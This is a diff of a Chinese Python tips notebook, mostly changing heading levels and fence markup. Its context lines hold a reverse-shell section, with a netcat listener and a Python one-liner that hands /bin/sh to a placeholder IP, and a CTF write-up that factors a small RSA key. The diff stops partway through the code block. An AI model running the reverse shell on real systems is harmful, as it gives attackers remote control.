@@ -9,7 +9,7 @@
 
 ----
 
-# 设置pip源
+## 设置pip源
 
 如果只需要一次性安装个包（如Dockerfile）： pip install -i https://pypi.doubanio.com/simple/ --trusted-host pypi.doubanio.com
 
@@ -34,7 +34,7 @@ index-url = http://pypi.doubanio.com/simple/
 trusted-host=pypi.doubanio.com
 ```
 
-# 反弹shell
+### 反弹shell
 
 首先自己的服务器上用**nc -l 端口**
 
@@ -54,13 +54,13 @@ p=subprocess.call(["/bin/sh","-i"])
 IP="x.x.x.x";PORT=6666;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( IP , PORT ));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
 ```
 
-## 获得一个tty
+### 获得一个tty
 
     python -c 'import pty; pty.spawn("/bin/sh")'
 
 ----
 
-# 让requests使用多个IP
+## 让requests使用多个IP
 
 requests包并没有使用socket.create_connection函数，所以替换socket.create_connection并不够
 
@@ -105,7 +105,7 @@ requests.packages.urllib3.util.connection.create_connection = function_hook_para
 
 ----
 
-# Python多线程模板
+## Python多线程模板
 
 使用threading模块进行开发
 
@@ -131,13 +131,13 @@ httpd.serve_forever()
 
 怎么知道MyHTTPServer的父类确实被修改了呢？ 可以查看其__mro__属性（Method Resolution Order attribute）
 
-### Old version 修改库代码
+### Old version 修改库代码(不建议)
 
 > 参考资料：[利用Python中SocketServer 实现客户端与服务器间非阻塞通信](http://blog.csdn.net/cnmilan/article/details/9664823)
 
 > 直接修改BaseHTTPServer的代码中的一个细节，将BaseHTTPServer类继承的原先只能支持单个请求的SocketServer.TCPServer改为每个连接一个线程的SocketServer.ThreadingTCPServer，使BaseHTTPServer能支持并发而不是一次只能处理单个请求
 
-#### Python3的方法：
+**Python3的方法**：
 
 在Python3中BaseHTTPServer改名为http.server了，首先找到http.server所在的py文件：
 
@@ -153,7 +153,7 @@ httpd.serve_forever()
 class HTTPServer(socketserver.ThreadingTCPServer):
 ```
 
-#### Python2的方法：
+**Python2的方法**：
 
 首先找到BaseHTTPServer在哪：
 
@@ -196,7 +196,7 @@ alias pip3=`pwd`/pip
 
 ----
 
-# 中文输出乱码问题
+## 中文输出乱码问题
 
 方法1：运行py前设置环境变量
 
@@ -213,7 +213,7 @@ sys.stdout=open(1, 'w', encoding='utf-8', closefd=False)
 
 ----
 
-# 遵循PEP8检查你的代码
+## 遵循PEP8检查你的代码
 
 [pycodestyle](https://github.com/PyCQA/pycodestyle)
 
@@ -226,7 +226,14 @@ pycodestyle --show-source --ignore=E501 yourcode.py
 
 ----
 
-# 生成随机字符串
+## 生成随机字符串
+
+```
+import random
+import string
+def random_str(length=8):
+    return "".join(random.sample(string.ascii_letters, length))
+```
 
 ```
 from random import Random
@@ -238,11 +245,11 @@ def random_str(randomlength=8):
     for i in range(randomlength):
         str+=chars[random.randint(0, length)]
     return str
-````
+```
 
 ----
 
-# Python解方程
+## Python解方程
 
 需要 `pip install sympy`
 
@@ -264,13 +271,13 @@ print(solve([ y-1+x, 3*x+2*y-5 ], [ x , y ]))
 
 ----
 
-# 大数据判断in
+## 大数据判断in
 
 一定要用set，因为set的in操作是O(1)的，用list是O(n)速度太慢
 
 ----
 
-# 解决Python.h: No such file or directory
+## 解决Python.h: No such file or directory
 
 ```
 apt-get install -y python-dev python3-dev
@@ -284,7 +291,7 @@ yum install python-devel
 
 ----
 
-# 二进制字符串转普通字符串
+## 二进制字符串转普通字符串
 
 方法一：将字符串每8个分成一组，用int转10进制，再用chr转为ascii字符
 
@@ -308,7 +315,7 @@ ans=binascii.unhexlify('%x'%int(s,2))
 
 ----
 
-# 十六进制字符串转bytes字符串
+## 十六进制字符串转bytes字符串
 
 ```
 from base64 import b16encode,b16decode
@@ -325,7 +332,7 @@ print( b16decode( hex(key)[2:].upper() ) )#output: b'I_4m-k3y'
 
 ----
 
-# 用Python3写PAT心得
+## 用Python3写PAT心得
 
 * 如果发生格式错误，检查输出的最后一行的print，加上end=""表示不要换行
 
@@ -333,7 +340,7 @@ print( b16decode( hex(key)[2:].upper() ) )#output: b'I_4m-k3y'
 
 ----
 
-# 用requests进行post
+## 用requests进行post
 
 需要注意加上这两个参数：
 
@@ -353,7 +360,7 @@ print( b16decode( hex(key)[2:].upper() ) )#output: b'I_4m-k3y'
 
 ----
 
-# 通过tkinter获取、修改剪贴板
+## 通过tkinter获取、修改剪贴板
 
 支持py2和py3，Learned from https://www.daniweb.com/programming/software-development/code/487653/access-the-clipboard-via-tkinter
 
@@ -376,9 +383,9 @@ print(clip_text)  # --> Donnerwetter
 
 ----
 
-# 符号数与无符号数转换
+## 符号数与无符号数转换
 
-## 无符号→有符号，为了加上负号：
+### 无符号→有符号，为了加上负号：
 
 ```
 import ctypes
@@ -387,7 +394,7 @@ ctypes.c_int64(17039472050328044269).value
 
 上述将得到-1407272023381507347
 
-## 有符号→无符号，为了去掉负号：
+### 有符号→无符号，为了去掉负号：
 
 ```
 import ctypes
@@ -398,7 +405,7 @@ ctypes.c_uint64(-1407272023381507347).value
 
 ----
 
-# 使用signal.SIGALRM在限定时间后退出进程 (only Linux)
+## 使用signal.SIGALRM在限定时间后退出进程 (only Linux)
 
 在设计CTF的题目的时候，有必要限制用户的连接时间，这时候简单方案就是用SIGALRM信号咯
 
@@ -415,7 +422,7 @@ def clock(timeout=5):
 
 ----
 
-# 捕捉用户的Ctrl+C
+## 捕捉用户的Ctrl+C
 
 特殊情况下我们想屏蔽掉Ctrl+C，这时候写个自己的函数处理SIGALRM信号就好啦
 
@@ -430,11 +437,11 @@ def signal_handler(signum,data):
 if __name__ == '__main__':
     signal.signal(signal.SIGINT, signal_handler)
     sleep(666)
-````
+```
 
 ----
 
-# 使用signal.SIGALRM实现定时器 (only Linux)
+## 使用signal.SIGALRM实现定时器 (only Linux)
 
 实现一个类似Javascript的setInterval功能
 
@@ -459,7 +466,7 @@ if __name__ == '__main__':
 
 ----
 
-# 使用pdb进行调试
+## 使用pdb进行调试
 
 在需要调试的文件头部加入
 
@@ -477,15 +484,15 @@ Tutorial: [https://github.com/spiside/pdb-tutorial](https://github.com/spiside/p
 
 ----
 
-# 使用Python开发Serverless(Function as Service)后端服务
+## 使用Python开发Serverless(Function as Service)后端服务
 
 [项目地址 & 部署过程](https://github.com/zjuchenyuan/zju-jwb-to-icalendar)
 
 如果您只是需要部署一个Example，↑↑↑(顺手求个Star)；如果您对这个代码是如何写出来的和踩坑过程感兴趣，继续看吧：
 
-## 踩过的坑与解决过程(论阿里云是怎么把人气死的)
+### 踩过的坑与解决过程(论阿里云是怎么把人气死的)
 
-### 1.API网关与函数计算的对接
+#### 1.API网关与函数计算的对接
 
 按照[教程](https://help.aliyun.com/document_detail/54788.html)，当时不够耐心，拿着hello world的程序（不要信教程中的2.1部分的截图）就在使用API网关，结果总是返回503
 
@@ -500,11 +507,13 @@ Tutorial: [https://github.com/spiside/pdb-tutorial](https://github.com/spiside/p
 }
 ```
 
-### 2.修改API网关参数定义后要再次发布
+#### 2.修改API网关参数定义后要再次发布
 
 无论有没有改Mock设置，只要改动了设置都需要重新发布，发布线上版本即可
 
-### 3.不能使用Windows版本的fcli工具(fcli.exe)
+#### 3.不能使用Windows版本的fcli工具(fcli.exe)
+
+人家已经发布了新版本的fcli解决了此问题
 
 这个bug简直了，整个流程如下：
 
@@ -559,9 +568,9 @@ os.listdir应该返回的是当前这个文件夹下含有的文件名称和文�
 
 ----
 
-# Crack RSA!
+## Crack RSA!
 
-## 题目信息
+### 题目信息
 
 题目来源：[清华蓝莲花战队纳新表（需自备梯子）](https://docs.google.com/forms/d/e/1FAIpQLSfOI5AgEvlqa6-nRLAZI8Dvs6_XmZDHSog2pKteS5rvp3AU0Q/viewform)
 
@@ -569,13 +578,13 @@ os.listdir应该返回的是当前这个文件夹下含有的文件名称和文�
 
 RSA算法的原理以及破解，请下载[这个文件](https://d.py3.io/rsa.zip)，解密其中的flag.enc文件。
 
-## RSA是啥
+### RSA是啥
 
 略...(连这个都不知道还不去google，你适不适合CTF心里一点B数都没有吗)
 
 符号约定： n一个大数， p和q是它的质因子，d私钥，m信息明文，c信息密文
 
-## 破解的数学原理
+### 破解的数学原理
 
 参考：https://stackoverflow.com/questions/4078902/cracking-short-rsa-keys
 
@@ -594,9 +603,9 @@ d = e^-1 mod phi(n)
 m = c^d (mod n)
 ```
 
-## 实现它
+### 实现它
 
-### 题目给的公钥是啥格式，怎么读取出N和e?
+#### 题目给的公钥是啥格式，怎么读取出N和e?
 
 题目给的公钥是这样的：
 
@@ -661,7 +670,7 @@ print(n)
 
 同理我们得知e=65537，一般RSA加密都会把公钥的e选为65537
 
-## 怎么分解n 得到p和q？
+#### 怎么分解n 得到p和q？
 
 你可以自己写代码，然而我懒，直接查数据库：
 
@@ -679,7 +688,7 @@ http://factordb.com/index.php?query=90499887424928873790510606439768063703452393
 
 p=283194537446483890135816972554288437117, q=319567913424286672035093410391626922443
 
-## 怎么计算私钥d
+#### 怎么计算私钥d
 
 根据RSA原理， d = e^-1 mod (p-1)\*(q-1)， 现在我们有了p和q，mod后面的(p-1)\*(q-1)自然是可以求出来的
 
@@ -740,7 +749,7 @@ print(d)
 
 上述python将输出34458919248694250828820386546500026880096887166581679876896066449320377773297， 真是一个好大的d啊。。。
 
-## 怎么把flag.enc当成一个int读入？
+#### 怎么把flag.enc当成一个int读入？
 
 试图用记事本打开flag.enc，乱码了；那用二进制形式打开flag.inc文件看看：
 ![](https://d.py3.io/img/15365186860.png)
@@ -770,7 +779,7 @@ c = int(binascii.b2a_hex(encrypteddata).decode(),16)
 print(c)
 ```
 
-## 计算明文
+#### 计算明文
 
 公式（密码学肯定要考的，所以再记一次咯）
 
@@ -820,7 +829,7 @@ print(m)
 ```
 得到输出 4114174865819530012247735243997890458185276719507135882385278623252053258
 
-## 明文这么一个大数 我要的flag呢？
+### 明文这么一个大数 我要的flag呢？
 
 cy打开了他的笔记本 [https://py3.io/Python.html#bytes](https://py3.io/Python.html#bytes)
 
@@ -861,7 +870,7 @@ b'\x02T\x1b:(\x02\xb9\x8c8\xbb\x00CTF{256i3_n0t_SAfe}\n'
 
 啊哈！ 总算能搞定啦，flag到手！
 
-## 完整的代码
+### 完整的代码
 
 ```
 # parse public key: https://stackoverflow.com/questions/3116907/rsa-get-exponent-and-modulus-given-a-public-key
